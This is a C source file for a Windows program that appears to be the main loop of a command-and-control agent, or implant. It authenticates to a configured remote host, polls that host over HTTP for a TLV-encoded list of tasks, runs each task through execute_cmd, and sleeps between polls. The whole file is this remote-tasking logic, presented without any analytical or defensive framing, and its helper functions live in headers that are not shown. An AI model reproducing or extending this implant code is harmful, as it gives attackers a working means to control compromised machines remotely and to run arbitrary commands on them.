#include <stdio.h>
#include <Lmcons.h>
#include <Windows.h>

#include <types.h>
#include <init.h>
#include <http_client.h>
#include <communication.h>
#include <commands.h>

#include <config.h>

#define PRINT_HEX( b, l )                               \
    printf( #b ": [%d] [ ", l );                        \
    for ( int i = 0 ; i < l; i++ )                      \
    {                                                   \
        printf( "%02x ", ( ( PUCHAR ) b ) [ i ] );      \
    }                                                   \
    puts( "]" );

struct Agent agent;

int main() {
  init();
  
  DWORD httpBytesRead;

  struct TLVBuild tasksTLV;
  struct TLVBuild taskTLV;
  struct TLVBuild argsTLV;

  char* tasksBuffer = malloc(1024);

  while (1) {  
    authenticate();
    while (1) {
      printf("fetching commands..\n");

      http_getrequest(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer);
      tasksBuffer[httpBytesRead] = 0x00;
      tasksTLV.allocsize = 1024;
      tasksTLV.buf = tasksBuffer;
      tasksTLV.bufsize = httpBytesRead;
      tasksTLV.read_cursor = 0;

      int tasksCount = extractInt32(&tasksTLV);
      extractInt32(&tasksTLV); // size of the tasks buffer, useless for us.

      for (int i = 0; i < tasksCount; i++) {
        int taskId = extractInt32(&tasksTLV);
        
        int taskActionId = extractInt32(&tasksTLV);
        int argBytes = extractInt32(&tasksTLV); 
        char * args = malloc(argBytes + 1);
        extractBytes(&tasksTLV, argBytes, args);
        args[argBytes] = 0x00;

        struct TLVBuild tlvArgs = tlvFromBuf(args, argBytes + 1);
        // tlvArgs.read_cursor = 0;
        // tlvArgs.buf = args;
        // tlvArgs.bufsize = argBytes + 1;
        // tlvArgs.allocsize = argBytes + 1;
        // PRINT_HEX(tlvArgs.buf, tlvArgs.bufsize);

        execute_cmd(taskActionId, taskId, extractInt32(&tlvArgs), &tlvArgs);

        free(args);
      }

      Sleep(5000);
    }
  }

  free(tasksBuffer);

  return 0;
}